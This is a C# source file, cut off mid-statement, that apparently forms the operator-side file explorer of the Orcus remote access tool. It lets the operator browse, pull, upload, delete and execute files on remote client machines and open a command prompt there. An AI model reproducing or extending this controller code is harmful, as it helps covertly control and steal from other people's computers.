using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Data;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Threading;
using Microsoft.Win32;
using Orcus.Administration.Commands.FileExplorer;
using Orcus.Administration.Core;
using Orcus.Administration.Core.CommandManagement.View;
using Orcus.Administration.Core.Logging;
using Orcus.Administration.FileExplorer.Helpers;
using Orcus.Administration.FileExplorer.Utilities;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Administration.ViewModels.CommandViewModels.FileExplorer;
using Orcus.Administration.ViewModels.ViewInterface;
using Orcus.Administration.ViewModels.ViewObjects;
using Orcus.Shared.Commands.FileExplorer;
using Orcus.Shared.DataTransferProtocol;
using Orcus.Shared.Utilities;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CommandViewModels
{
    [MinimumClientVersion(19)]
    public class FileExplorerViewModel : CommandView
    {
        private readonly Dictionary<FileEntryViewModel, CancellationTokenSource> _bigThumbnailsCancellationTokenSources;
        private readonly List<IWindow> _openWindows;
        private readonly List<FileEntryViewModel> _thumbnailQueue;
        private CancellationTokenSource _bigThubmnailLoadingCancellationTokenSource;
        private RelayCommand _createArchiveCommand;
        private RelayCommand _createFolderCommand;
        private RelayCommand _createShortcutCommand;
        private RelayCommand _createZipArchiveFastCommand;
        private string _currentPath;
        private RelayCommand _downloadEntriesCommand;
        private RelayCommand _downloadFileFromUrlCommand;
        private RelayCommand _downloadToServerCommand;
        private CollectionViewSource _entries;
        private ObservableCollection<IEntryViewModel> _entriesViewModels;
        private RelayCommand _executeFileCommand;
        private RelayCommand _extractArchiveCommand;
        private FileExplorerCommand _fileExplorerCommand;
        private IWindow _fileExplorerTransferManagerWindow;
        private IFileSystem _fileSystem;
        private RelayCommand _fileToolTipClosedCommand;
        private RelayCommand _fileToolTipOpenedCommand;
        private RelayCommand _goBackInHistoryCommand;
        private RelayCommand _goForwardInHistoryCommand;
        private bool _isLoading;
        private bool _isLoadingRootElements;
        private RelayCommand _openCommandPromptHereCommand;
        private RelayCommand _openDirectoryCommand;
        private RelayCommand _openDirectoryPropertiesCommand;
        private RelayCommand _openFilePropertiesCommand;
        private RelayCommand _openFileTransferManagerCommand;
        private CancellationTokenSource _openPathCancellationToken;
        private RelayCommand _refreshItemsCommand;
        private RelayCommand _removeEntriesCommand;
        private string _searchText;
        private List<IEntryViewModel> _selectedEntries;
        private int _selectedItemsCount;
        private bool _showThumbnails;
        private RelayCommand _textBoxUpdateCommand;
        private CancellationTokenSource _thumbnailLoadingCancellationTokenSource;
        private RelayCommand _uploadFileCommand;
        private RangeInfo _visibleItemsRange;

        public FileExplorerViewModel()
        {
            _openWindows = new List<IWindow>();
            _thumbnailQueue = new List<FileEntryViewModel>();
            _bigThumbnailsCancellationTokenSources = new Dictionary<FileEntryViewModel, CancellationTokenSource>();
        }

        public override string Name { get; } = (string) Application.Current.Resources["FileExplorer"];
        public override Category Category { get; } = Category.System;

        public DirectoryTreeViewModel DirectoryTreeViewModel { get; private set; }
        public FileTransferManagerViewModel FileTransferManagerViewModel { get; private set; }
        public PathHistoryManager PathHistoryManager { get; private set; }
        public bool SupportShowThumbnail => ClientController.Client.Version > 17; //version17disable

        public string CurrentPath
        {
            get { return _currentPath; }
            private set { SetProperty(value, ref _currentPath); }
        }

        public CollectionViewSource Entries
        {
            get { return _entries; }
            set { SetProperty(value, ref _entries); }
        }

        public string SearchText
        {
            get { return _searchText; }
            set
            {
                if (SetProperty(value, ref _searchText))
                    Entries?.View.Refresh();
            }
        }

        public int SelectedItemsCount
        {
            get { return _selectedItemsCount; }
            set { SetProperty(value, ref _selectedItemsCount); }
        }

        public bool IsLoading
        {
            get { return _isLoading; }
            set { SetProperty(value, ref _isLoading); }
        }

        public bool ShowThumbnails
        {
            get { return _showThumbnails; }
            set
            {
                if (SetProperty(value, ref _showThumbnails) && value)
                    GetFileThumbnails();
            }
        }

        public RangeInfo VisibleItemsRange
        {
            get { return _visibleItemsRange; }
            set
            {
                if (SetProperty(value, ref _visibleItemsRange) && ShowThumbnails)
                    GetFileThumbnails();
            }
        }

        public RelayCommand TextBoxUpdateCommand
        {
            get
            {
                return _textBoxUpdateCommand ??
                       (_textBoxUpdateCommand = new RelayCommand(parameter => { OpenPath((string) parameter); }));
            }
        }

        public RelayCommand OpenDirectoryCommand
        {
            get
            {
                return _openDirectoryCommand ?? (_openDirectoryCommand = new RelayCommand(parameter =>
                {
                    var directoryViewModel = parameter as DirectoryNodeViewModel;
                    if (directoryViewModel == null)
                        return;

                    OpenPath(directoryViewModel.Value.Path);
                }));
            }
        }

        public RelayCommand RemoveEntriesCommand
        {
            get
            {
                return _removeEntriesCommand ?? (_removeEntriesCommand = new RelayCommand(async parameter =>
                {
                    if (_selectedEntries == null || _selectedEntries.Count == 0)
                        return;

                    var directoriesToRemove = _selectedEntries.OfType<DirectoryNodeViewModel>().ToList();
                    var filesToRemove = _selectedEntries.OfType<FileEntryViewModel>().ToList();
                    string message;

                    //that shit was more work than I thought...
                    //1 file
                    if (directoriesToRemove.Count == 0 && filesToRemove.Count == 1)
                        message = string.Format((string) Application.Current.Resources["AreYouSureRemoveOneFile"],
                            filesToRemove[0].Name);
                    //x files
                    else if (directoriesToRemove.Count == 0)
                        message = string.Format((string) Application.Current.Resources["AreYouSureRemoveFiles"],
                            filesToRemove.Count);
                    //1 directory
                    else if (filesToRemove.Count == 0 && directoriesToRemove.Count == 1)
                        message = string.Format((string) Application.Current.Resources["AreYouSureRemoveOneDirectory"],
                            directoriesToRemove[0].Name);
                    //x directories
                    else if (filesToRemove.Count == 0)
                        message = string.Format((string) Application.Current.Resources["AreYouSureRemoveDirectories"],
                            directoriesToRemove.Count);
                    //1 directory x files
                    else if (directoriesToRemove.Count == 1 && filesToRemove.Count > 1)
                        message = string.Format(
                            (string) Application.Current.Resources["AreYouSureRemoveFilesDirectory"],
                            directoriesToRemove[0].Name, filesToRemove.Count);
                    //x directories 1 file
                    else if (directoriesToRemove.Count > 1 && filesToRemove.Count == 1)
                        message =
                            string.Format((string) Application.Current.Resources["AreYouSureRemoveFileDirectories"],
                                filesToRemove[0].Name, directoriesToRemove.Count);
                    //x directories x files
                    else if (directoriesToRemove.Count > 1 && filesToRemove.Count > 1)
                        message =
                            string.Format((string) Application.Current.Resources["AreYouSureRemoveFilesDirectories"],
                                filesToRemove.Count, directoriesToRemove.Count);
                    //1 directory 1 file
                    else
                        message = string.Format(
                            (string) Application.Current.Resources["AreYouSureRemoveFileDirectory"],
                            filesToRemove[0].Name, directoriesToRemove[0].Name);

                    if (
                        WindowService.ShowMessageBox(message, (string) Application.Current.Resources["Warning"],
                            MessageBoxButton.OKCancel, MessageBoxImage.Warning) != MessageBoxResult.OK)
                        return;

                    IsLoading = true;
                    try
                    {
                        var result = await _fileSystem.Remove(_selectedEntries.Select(x => x.Value));
                        if (result?.Count > 0)
                        {
                            WindowServiceInterface.Current.OpenWindowServiceDialog(WindowService,
                                new FailedEntryDeletionsViewModel(result));
                        }
                    }
                    catch (Exception ex)
                    {
                        WindowService.ShowMessageBox(ex.Message, (string) Application.Current.Resources["Error"],
                            MessageBoxButton.OK, MessageBoxImage.Error);
                    }
                    finally
                    {
                        IsLoading = false;
                    }
                }));
            }
        }

        public RelayCommand OpenCommandPromptHereCommand
        {
            get
            {
                return _openCommandPromptHereCommand ?? (_openCommandPromptHereCommand = new RelayCommand(parameter =>
                {
                    if (ClientController.Client.Version < 12) //version12disable
                    {
                        WindowService.ShowMessageBox((string) Application.Current.Resources["ClientUpdateRequired"]);
                        return;
                    }

                    var directoryNode = parameter as DirectoryNodeViewModel;
                    CrossViewManager.OpenCommandPrompt(directoryNode?.Value.Path ?? CurrentPath);
                }));
            }
        }

        public RelayCommand CreateFolderCommand
        {
            get
            {
                return _createFolderCommand ?? (_createFolderCommand = new RelayCommand(async parameter =>
                {
                    var path = (parameter as DirectoryNodeViewModel)?.Value.Path ?? CurrentPath;
                    var inputViewModel = new InputTextViewModel((string) Application.Current.Resources["NewFolder"],
                        (string) Application.Current.Resources["FolderName"],
                        (string) Application.Current.Resources["Create"]);

                    if (
                        WindowServiceInterface.Current.OpenWindowServiceDialog(WindowService, inputViewModel,
                            (string) Application.Current.Resources["CreateNewFolder"]) != true)
                        return;

                    try
                    {
                        await _fileSystem.CreateFolder(Path.Combine(path, inputViewModel.Text));
                    }
                    catch (Exception ex)
                    {
                        if (ex is ServerException && ex.InnerException != null)
                            Logger.Error(ex.InnerException.Message);
                        else
                            Logger.Error(ex.Message);
                    }
                }));
            }
        }

        public RelayCommand CreateShortcutCommand
        {
            get
            {
                return _createShortcutCommand ?? (_createShortcutCommand = new RelayCommand(async parameter =>
                {
                    var createShortcutViewModel = new CreateShortcutViewModel();
                    if (
                        WindowServiceInterface.Current.OpenWindowServiceDialog(WindowService, createShortcutViewModel) !=
                        true)
                        return;

                    try
                    {
                        await
                            _fileSystem.CreateShortcut(Path.Combine(CurrentPath, createShortcutViewModel.Filename),
                                createShortcutViewModel.ShortcutInfo);
                    }
                    catch (Exception ex)
                    {
                        if (ex is ServerException && ex.InnerException != null)
                            Logger.Error(ex.InnerException.Message);
                        else
                            Logger.Error(ex.Message);
                    }
                }));
            }
        }

        public RelayCommand OpenDirectoryPropertiesCommand
        {
            get
            {
                return _openDirectoryPropertiesCommand ??
                       (_openDirectoryPropertiesCommand = new RelayCommand(async parameter =>
                       {
                           var directory = (DirectoryNodeViewModel) parameter;
                           IsLoading = true;
                           DirectoryPropertiesInfo directoryProperties;
                           try
                           {
                               directoryProperties =
                                   await
                                       Task.Run(
                                           () => _fileExplorerCommand.GetDirectoryPropertiesInfo(directory.Value.Path));
                           }
                           catch (Exception ex)
                           {
                               MessageBox.Show(ex.Message);
                               return;
                           }

                           IsLoading = false;
                           var window = WindowServiceInterface.Current.OpenWindowCentered(WindowService,
                                   new PropertiesViewModel(directory, directoryProperties),
                                   string.Format((string) Application.Current.Resources["PropertiesOf"], directory.Label))
                               .Value;

                           _openWindows.Add(window);
                           window.Closed += (sender, args) => _openWindows.Remove(window);
                       }));
            }
        }

        public RelayCommand OpenFilePropertiesCommand
        {
            get
            {
                return _openFilePropertiesCommand ?? (_openFilePropertiesCommand = new RelayCommand(async parameter =>
                {
                    var fileEntryViewModel = (FileEntryViewModel) parameter;
                    IsLoading = true;
                    FilePropertiesInfo fileProperties;
                    try
                    {
                        fileProperties =
                            await
                                Task.Run(() => _fileExplorerCommand.GetFilePropertiesInfo(fileEntryViewModel.Value.Path));
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                        return;
                    }

                    IsLoading = false;
                    var window = WindowServiceInterface.Current.OpenWindowCentered(WindowService,
                            new PropertiesViewModel(fileEntryViewModel, fileProperties, _fileExplorerCommand),
                            string.Format((string) Application.Current.Resources["PropertiesOf"],
                                fileEntryViewModel.Label))
                        .Value;

                    _openWindows.Add(window);
                    window.Closed += (sender, args) => _openWindows.Remove(window);
                }));
            }
        }

        public RelayCommand ExecuteFileCommand
        {
            get
            {
                return _executeFileCommand ?? (_executeFileCommand = new RelayCommand(async parameter =>
                {
                    var fileEntryViewModel = parameter as FileEntryViewModel;
                    if (fileEntryViewModel == null)
                        return;

                    var executeFileViewModel = new ExecuteFileViewModel(fileEntryViewModel);

                    if (
                        WindowServiceInterface.Current.OpenWindowServiceDialog(WindowService, executeFileViewModel,
                            string.Format((string) Application.Current.Resources["ExecuteFile"], fileEntryViewModel.Name)) !=
                        true)
                        return;

                    try
                    {
                        await
                            _fileSystem.ExecuteFile(fileEntryViewModel.Value.Path, executeFileViewModel.Arguments,
                                executeFileViewModel.Verb, executeFileViewModel.CreateNoWindow);
                    }
                    catch (Exception ex)
                    {
                        WindowService.ShowMessageBox(ex.Message, (string) Application.Current.Resources["Error"],
                            MessageBoxButton.OK, MessageBoxImage.Error);
                    }
                }));
            }
        }

        public RelayCommand OpenFileTransferManagerCommand
        {
            get
            {
                return _openFileTransferManagerCommand ??
                       (_openFileTransferManagerCommand = new RelayCommand(parameter => { OpenFileTransferManager(); }));
            }
        }

        public RelayCommand UploadFileCommand
        {
            get
            {
                return _uploadFileCommand ?? (_uploadFileCommand = new RelayCommand(parameter =>
                {
                    var ofd = new OpenFileDialog
                    {
                        CheckFileExists = true,
                        CheckPathExists = true,
                        Multiselect = true,
                        Title = string.Format((string) Application.Current.Resources["UploadFilesTitle"], CurrentPath)
                    };
                    if (WindowService.ShowDialog(ofd.ShowDialog) != true)
                        return;

                    var filesToUpload = ofd.FileNames;
                    FileTransferManagerViewModel.UploadFiles(filesToUpload, CurrentPath);
                    OpenFileTransferManager();
                }));
            }
        }

        public RelayCommand RefreshItemsCommand
        {
            get
            {
                return _refreshItemsCommand ??
                       (_refreshItemsCommand = new RelayCommand(parameter => { OpenPath(CurrentPath, true); }));
            }
        }

        public RelayCommand DownloadEntriesCommand
        {
            get
            {
                return _downloadEntriesCommand ?? (_downloadEntriesCommand = new RelayCommand(parameter =>
                {
                    var files = ((IList) parameter).OfType<FileEntryViewModel>().Select(x => x.Value.Path).ToList();
                    var directories =
                        ((IList) parameter).OfType<DirectoryNodeViewModel>().Select(x => x.Value.Path).ToList();

                    var downloadDirectory = new DirectoryInfo("Downloads");
                    if (!downloadDirectory.Exists)
                        downloadDirectory.Create();

                    if (files.Count > 0)
                        FileTransferManagerViewModel.DownloadFiles(files, "Downloads");
                    if (directories.Count > 0)
                        FileTransferManagerViewModel.DownloadDirectories(directories, "Downloads");
                }));
            }
        }

        public RelayCommand DownloadToServerCommand
        {
            get
            {
                return _downloadToServerCommand ?? (_downloadToServerCommand = new RelayCommand(async parameter =>
                {
                    var entries = ((IList) parameter).Cast<IEntryViewModel>().Where(x => x.IsFileSystemEntry()).ToList();

                    var results = new List<DownloadResult>();
                    foreach (var entry in entries)
                    {
                        try
                        {
                            results.Add(
                                await
                                    Task.Run(
                                        () =>
                                            _fileExplorerCommand.DownloadToServer(entry.Value.Path,
                                                entry.EntryType == EntryType.Directory)));
                        }
                        catch (Exception ex)
                        {
                            MessageBox.Show(
                                "Please open a ticket at orcus.pw and copy & paste this message (you can just press Ctrl+C now) there, thank you\r\n" +
                                "Path: " + entry.Value.Path +
                                "\r\n----------------------------------------------------\r\n" +
                                ex);
                            return;
                        }
                    }

                    LogService.Receive(string.Format((string) Application.Current.Resources["DownloadToServerResult"],
                        results.Count(x => x == DownloadResult.Succeed),
                        results.Count(x => x != DownloadResult.Succeed)));
                }));
            }
        }

        public RelayCommand GoBackInHistoryCommand
        {
            get
            {
                return _goBackInHistoryCommand ?? (_goBackInHistoryCommand = new RelayCommand(parameter =>
                {
                    if (PathHistoryManager.CanGoBack)
                        OpenPath(PathHistoryManager.GoBack());
                }));
            }
        }

        public RelayCommand GoForwardInHistoryCommand
        {
            get
            {
                return _goForwardInHistoryCommand ?? (_goForwardInHistoryCommand = new RelayCommand(parameter =>
                {
                    if (PathHistoryManager.CanGoForward)
                        OpenPath(PathHistoryManager.GoForward());
                }));
            }
        }

        public RelayCommand FileToolTipOpenedCommand
        {
            get
            {
                return _fileToolTipOpenedCommand ?? (_fileToolTipOpenedCommand = new RelayCommand(async parameter =>
                {
                    var fileEntryViewModel = (FileEntryViewModel) parameter;

                    CancellationTokenSource bigThumbnailCancellationTokenSource;
                    if (_bigThumbnailsCancellationTokenSources.TryGetValue(fileEntryViewModel,
                        out bigThumbnailCancellationTokenSource))
                    {
                        bigThumbnailCancellationTokenSource.Cancel();
                        return;
                    }

                    _bigThubmnailLoadingCancellationTokenSource?.Cancel();
                    _bigThubmnailLoadingCancellationTokenSource = new CancellationTokenSource();
                    var token = _bigThubmnailLoadingCancellationTokenSource.Token;

                    var data =
                        await Task.Run(() => _fileExplorerCommand.GetFileThumbnail(fileEntryViewModel.Value.Path, true));

                    var image = new BitmapImage();
                    using (var mem = new MemoryStream(data))
                    {
                        mem.Position = 0;
                        image.BeginInit();
                        image.CreateOptions = BitmapCreateOptions.PreservePixelFormat;
                        image.CacheOption = BitmapCacheOption.OnLoad;
                        image.UriSource = null;
                        image.StreamSource = mem;
                        image.EndInit();
                    }
                    image.Freeze();

                    if (!token.IsCancellationRequested)
                        fileEntryViewModel.BigThumbnail = image;
                    else
                        Debug.Print("big thumbnail nulled");
                }));
            }
        }

        public RelayCommand FileToolTipClosedCommand
        {
            get
            {
                return _fileToolTipClosedCommand ?? (_fileToolTipClosedCommand = new RelayCommand(async parameter =>
                {
                    var fileEntryViewModel = (FileEntryViewModel) parameter;
                    _bigThubmnailLoadingCancellationTokenSource?.Cancel();
                    if (fileEntryViewModel.BigThumbnail != null)
                    {
                        var cancellationTokenSource = new CancellationTokenSource();
                        _bigThumbnailsCancellationTokenSources.Add(fileEntryViewModel, cancellationTokenSource);

                        try
                        {
                            await Task.Delay(5000, cancellationTokenSource.Token);
                        }
                        catch (TaskCanceledException)
                        {
                            Debug.Print("Seems like someone still wants to use that image");
                            return;
                        }
                        finally
                        {
                            _bigThumbnailsCancellationTokenSources.Remove(fileEntryViewModel);
                        }

                        fileEntryViewModel.BigThumbnail = null;
                        Debug.Print("big thumbnail nulled");
                    }
                }));
            }
        }

        public RelayCommand CreateArchiveCommand
        {
            get
            {
                return _createArchiveCommand ?? (_createArchiveCommand = new RelayCommand(parameter =>
                {
                    if (_selectedEntries == null || _selectedEntries.Count == 0)
                        return;

                    var entries =
                        _selectedEntries.Where(x => x.IsFileSystemEntry())
                            .Select(
                                x =>
                                    new EntryInfo
                                    {
                                        IsDirectory = x.IsDirectory(),
                                        Path = x.Value.Path
                                    })
                            .ToList();

                    var viewModel = new ArchiveOptionsViewModel(entries);
                    if (WindowServiceInterface.Current.OpenWindowServiceDialog(WindowService, viewModel) == true)
                    {
                        Task.Run(() => _fileExplorerCommand.CreateArchive(new ArchiveOptions
                        {
                            ArchivePath = Path.Combine(CurrentPath, viewModel.ArchiveName),
                            CompressionLevel = viewModel.CompressionLevel,
                            CompressionMethod = viewModel.CompressionMethod,
                            DeleteAfterArchiving = viewModel.DeleteFilesAfterArchiving,
                            Entries = entries,
                            Password = viewModel.Password,
                            UseTarPacker = viewModel.UseTarAsPacker
                        }));
                    }
                }));
            }
        }

        public RelayCommand CreateZipArchiveFastCommand
        {
            get
            {
                return _createZipArchiveFastCommand ?? (_createZipArchiveFastCommand = new RelayCommand(parameter =>
                {
                    if (_selectedEntries == null || _selectedEntries.Count == 0)
                        return;

                    var entry = (IEntryViewModel) parameter;
                    if (!entry.IsFileSystemEntry())
                        return;

                    var fileName = Path.Combine(CurrentPath,
                        (entry.IsDirectory() ? entry.Name : ((FileEntryViewModel) parameter).NameWithoutExtension) +
                        ".zip");

                    var entries =
                        _selectedEntries.Select(x => new EntryInfo {IsDirectory = x.IsDirectory(), Path = x.Value.Path})
                            .ToList();

                    Task.Run(() => _fileExplorerCommand.CreateArchive(new ArchiveOptions
                    {
                        ArchivePath = Path.Combine(entry.Value.Path, fileName),
                        CompressionLevel = 5,
                        CompressionMethod = CompressionMethod.Zip,
                        DeleteAfterArchiving = false,
                        Entries = entries,
                        Password = null,
                        UseTarPacker = false
                    }));
                }));
            }
        }

        public RelayCommand ExtractArchiveCommand
        {
            get
            {
                return _extractArchiveCommand ?? (_extractArchiveCommand = new RelayCommand(parameter =>
                {
                    var fileEntry = (FileEntryViewModel) parameter;
                    Task.Run(() => _fileExplorerCommand.ExtractArchive(fileEntry.Value.Path, CurrentPath));
                }));
            }
        }

        private RelayCommand _extractArchiveToCommand;

        public RelayCommand ExtratArchiveToCommand
        {
            get
            {
                return _extractArchiveToCommand ?? (_extractArchiveToCommand = new RelayCommand(parameter =>
                {
                    var fileEntry = (FileEntryViewModel) parameter;
                    Task.Run(
                        () =>
                            _fileExplorerCommand.ExtractArchive(fileEntry.Value.Path,
                                Path.Combine(CurrentPath, fileEntry.NameWithoutExtension)));
                }));
            }
        }

        public RelayCommand DownloadFileFromUrlCommand
        {
            get
            {
                return _downloadFileFromUrlCommand ?? (_downloadFileFromUrlCommand = new RelayCommand(parameter =>
                {
                    var viewModel = new DownloadFileViewModel(CurrentPath);
                    if (WindowServiceInterface.Current.OpenWindowServiceDialog(WindowService, viewModel) != true)
                        return;

                    Task.Run(
                        () => _fileExplorerCommand.DownloadFileFromUrl(viewModel.RemotePath, viewModel.Url));
                }));
            }
        }

        public override void Dispose()
        {
            base.Dispose();
            _fileExplorerTransferManagerWindow?.Close();
            _fileExplorerTransferManagerWindow = null;
            for (int i = _openWindows.Count - 1; i >= 0; i--)
                _openWindows[i].Close();

            _openWindows.Clear();
        }

        protected override void InitializeView(IClientController clientController, ICrossViewManager crossViewManager)
        {
            _fileExplorerCommand = clientController.Commander.GetCommand<FileExplorerCommand>();
            _fileExplorerCommand.DownloadPackageReceived += FileExplorerCommandOnDownloadPackageReceived;
            _fileExplorerCommand.DownloadFailed += FileExplorerCommandOnDownloadFailed;

            EventHandler<string> method = OpenPathCrossMethod;
            crossViewManager.RegisterMethod(this,
                new Guid(0x417b8c5a, 0xe218, 0x0145, 0x9c, 0xfe, 0xff, 0xc7, 0x02, 0xc6, 0x61, 0x48), method);
        }

        protected override ImageSource GetIconImageSource()
        {
            return
                new BitmapImage(new Uri("pack://application:,,,/Resources/Images/VisualStudio/ListFolder_16x.png",
                    UriKind.Absolute));
        }

        public void SelectedEntriesChanged(List<IEntryViewModel> selectedEntries)
        {
            SelectedItemsCount = selectedEntries.Count;
            _selectedEntries = selectedEntries;
        }

        private async void OpenPathCrossMethod(object sender, string s)
        {
            if (!_isLoadingRootElements)
                await LoadRootElements(s);
            else
                OpenPath(s);
        }

        public override void LoadView(bool loadData)
        {
            _fileSystem = new RemoteFileSystem(_fileExplorerCommand);
            _fileSystem.DirectoryEntriesUpdated += FileSystemOnDirectoryEntriesUpdated;
            _fileSystem.FileExplorerEntryRemoved += FileSystemOnFileExplorerEntryRemoved;
            _fileSystem.FileExplorerEntryAdded += FileSystemOnFileExplorerEntryAdded;
            _fileExplorerCommand.ProcessingEntryUpdateReceived += FileExplorerCommandOnProcessingEntryUpdateReceived;
            _fileExplorerCommand.ProcessingEntryAdded += FileExplorerCommandOnProcessingEntryAdded;

            DirectoryTreeViewModel = new DirectoryTreeViewModel(_fileSystem, () => WindowService);

            FileTransferManagerViewModel = new FileTransferManagerViewModel(_fileExplorerCommand);
            FileTransferManagerViewModel.FileUploaded += FileTransferManagerViewModelOnFileUploaded;
            FileTransferManagerViewModel.BeginFileUpload += FileTransferManagerViewModelOnBeginFileUpload;

            PathHistoryManager = new PathHistoryManager();

            if (!_isLoadingRootElements) //important
                LoadRootElements().Forget();
        }

        private void FileExplorerCommandOnProcessingEntryAdded(object sender, ProcessingEntry processingEntry)
        {
            if (Path.GetDirectoryName(processingEntry.Path).NormalizePath() != CurrentPath.NormalizePath())
                return;

            Application.Current.Dispatcher.BeginInvoke(new Action(() =>
            {
                _entriesViewModels.Add(new ProcessingEntryViewModel(processingEntry,
                    x => Task.Run(() => _fileExplorerCommand.CancelProcessingEntry(x)), _fileSystem));
            }));
        }

        private void FileExplorerCommandOnProcessingEntryUpdateReceived(object sender,
            ProcessingEntryUpdate processingEntryUpdate)
        {
            if (_entriesViewModels == null)
                return; //too early

            var processingEntry =
                _entriesViewModels.FirstOrDefault(x => x.Value.Path == processingEntryUpdate.Path) as
                    ProcessingEntryViewModel;
            if (processingEntry != null)
            {
                processingEntry.Update(processingEntryUpdate);

                if (processingEntryUpdate.Progress == 1)
                    Application.Current.Dispatcher.BeginInvoke(
                        new Action(() =>
                        {
                            _entriesViewModels.Remove(processingEntry);
                            switch (processingEntry.Action)
                            {
                                case ProcessingEntryActionAdvanced.Packing:
                                case ProcessingEntryActionAdvanced.Extracting:
                                case ProcessingEntryActionAdvanced.Downloading:
                                     _entriesViewModels.Add(processingEntry.IsDirectory
                                        ? (IEntryViewModel)
                                        new DirectoryNodeViewModel(
                                            ((ProcessingEntry) processingEntry.Value).ToDirectoryEntry(), _fileSystem)
                                        : new FileEntryViewModel(((ProcessingEntry) processingEntry.Value).ToFileEntry(),
                                            _fileSystem));
                                    break;
                            }
                        }));
                else if (processingEntryUpdate.Progress == -1)
                    Application.Current.Dispatcher.BeginInvoke(
                        new Action(() => _entriesViewModels.Remove(processingEntry)));
            }
        }

        private async Task LoadRootElements(string path = null)
        {
            if (_isLoadingRootElements)
                return;

            _isLoadingRootElements = true;
            IsLoading = true;

            RootEntryCollection rootEntryCollection;
            try
            {
                rootEntryCollection = await Task.Run(() => _fileExplorerCommand.GetRootElements());
            }
            catch (Exception ex)
            {
                var serverEx = ex as ServerException;
                WindowService.ShowMessageBox(
                    "Please open a ticket at orcus.pw and copy & paste this message (you can just press Ctrl+C now) there, thank you\r\n" +
                    (serverEx?.ServerMessage ?? "ServerMessage = null") +
                    "\r\n----------------------------------------------------\r\n" +
                    ex);
                throw;
            }

            rootEntryCollection.ComputerDirectory.Unpack(null);
            ((RemoteFileSystem) _fileSystem).AddToCache(rootEntryCollection.ComputerDirectory,
                rootEntryCollection.ComputerDirectoryEntries, false);

            var rootModels = new PackedDirectoryEntry[rootEntryCollection.RootDirectories.Count + 1];
            for (int i = 0; i < rootEntryCollection.RootDirectories.Count; i++)
                rootModels[i] = rootEntryCollection.RootDirectories[i];

            rootModels[rootModels.Length - 1] = rootEntryCollection.ComputerDirectory;

            DirectoryTreeViewModel.RootModels = rootModels;
            DirectoryTreeViewModel.Selection.AsRoot().SelectionChanged += OnSelectionChanged;

            await Application.Current.Dispatcher.BeginInvoke(DispatcherPriority.ApplicationIdle, new Action(async () =>
            {
                await DirectoryTreeViewModel.InitializeAllRoots(rootEntryCollection.ComputerDirectory);
                var entry = DirectoryTreeViewModel.Entries.AllNonBindable.Last();
                entry.Entries.IsExpanded = true;
                if (path != null)
                    OpenPath(path);
                else
                    DirectoryTreeViewModel.Selection.AsRoot()
                        .SelectAsync(rootEntryCollection.ComputerDirectory).Forget();

                entry.IsBringIntoView = true;
            }));

            IsLoading = false;
        }

        private void FileTransferManagerViewModelOnFileUploaded(object sender, FileEntry fileEntry)
        {
            var directoryName = Path.GetDirectoryName(fileEntry.Path);
            if (directoryName?.Equals(CurrentPath, StringComparison.OrdinalIgnoreCase) == true)
                Application.Current.Dispatcher.BeginInvoke(
                    new Action(() =>
                    {
                        var processingEntryViewModel =
                            _entriesViewModels.FirstOrDefault(x => x.Value.Path == fileEntry.Path);
                        if (processingEntryViewModel != null)
                            _entriesViewModels.Remove(processingEntryViewModel);

                        _entriesViewModels.Add(new FileEntryViewModel(fileEntry, _fileSystem));
                    }));
        }

        private void FileTransferManagerViewModelOnBeginFileUpload(object sender, FileTransferTask fileTransferTask)
        {
            var directoryName = Path.GetDirectoryName(fileTransferTask.TargetPath);
            if (directoryName?.Equals(CurrentPath, StringComparison.OrdinalIgnoreCase) == true)
                Application.Current.Dispatcher.BeginInvoke(
                    new Action(() =>
                    {
                        var entry = new ProcessingEntryViewModel(fileTransferTask, _fileSystem);
                        _entriesViewModels.Add(entry);
                        fileTransferTask.CancelRequest += (o, args) => _entriesViewModels.Remove(entry);
                    }));
        }

        private void FileExplorerCommandOnDownloadPackageReceived(object sender, byte[] bytes)
        {
            FileTransferManagerViewModel.PackageReceived(bytes, 1);
        }

        private void FileExplorerCommandOnDownloadFailed(object sender, Guid guid)
        {
            FileTransferManagerViewModel.DownloadFailed(guid);
        }

        private void FileSystemOnFileExplorerEntryAdded(object sender, EntryAddedInfo entryAddedInfo)
        {
            if (entryAddedInfo.Path.Equals(CurrentPath, StringComparison.OrdinalIgnoreCase) &&
                !_entriesViewModels.Any(
                    x => string.Equals(x.Name, entryAddedInfo.AddedEntry.Name, StringComparison.OrdinalIgnoreCase)))
            {
                if (entryAddedInfo.AddedEntry is PackedDirectoryEntry directoryEntry)
                    _entriesViewModels.Add(new DirectoryNodeViewModel(directoryEntry, _fileSystem));
                else if (entryAddedInfo.AddedEntry is FileEntry fileEntry)
                    _entriesViewModels.Add(new FileEntryViewModel(fileEntry, _fileSystem));
                else if (entryAddedInfo.AddedEntry is ProcessingEntry processingEntry)
                    _entriesViewModels.Add(new ProcessingEntryViewModel(processingEntry,
                        x => Task.Run(() => _fileExplorerCommand.CancelProcessingEntry(x)), _fileSystem));
            }
        }

        private void FileSystemOnFileExplorerEntryRemoved(object sender, IFileExplorerEntry fileExplorerEntry)
        {
            var viewModel = _entriesViewModels.FirstOrDefault(x => x.Value.Equals(fileExplorerEntry));
            if (viewModel != null)
                _entriesViewModels.Remove(viewModel);
        }

        private void FileSystemOnDirectoryEntriesUpdated(object sender, DirectoryEntriesUpdate directoryEntriesUpdate)
        {
            if (_entriesViewModels != null && CurrentPath == directoryEntriesUpdate.DirectoryPath)
            {
                List<IFileExplorerEntry> allItems;
                if (directoryEntriesUpdate.DirectoriesOnly)
                {
                    allItems = new List<IFileExplorerEntry>(directoryEntriesUpdate.Entries);
                    allItems.AddRange(_entriesViewModels.OfType<FileEntryViewModel>().Select(x => x.Value));
                }
                else
                {
                    allItems = directoryEntriesUpdate.Entries;
                }

                GenerateEntries(allItems, false);
            }
        }

        private void GenerateEntries(List<IFileExplorerEntry> fileExplorerEntries, bool keepOrder)
        {
            List<IEntryViewModel> entries;
            if (keepOrder)
            {
                var counter = 0;
                entries = new List<IEntryViewModel>(
                    fileExplorerEntries.OfType<PackedDirectoryEntry>()
                        .Select(x => new DirectoryNodeViewModel(x, _fileSystem, counter++)));
            }
            else
                entries = new List<IEntryViewModel>(
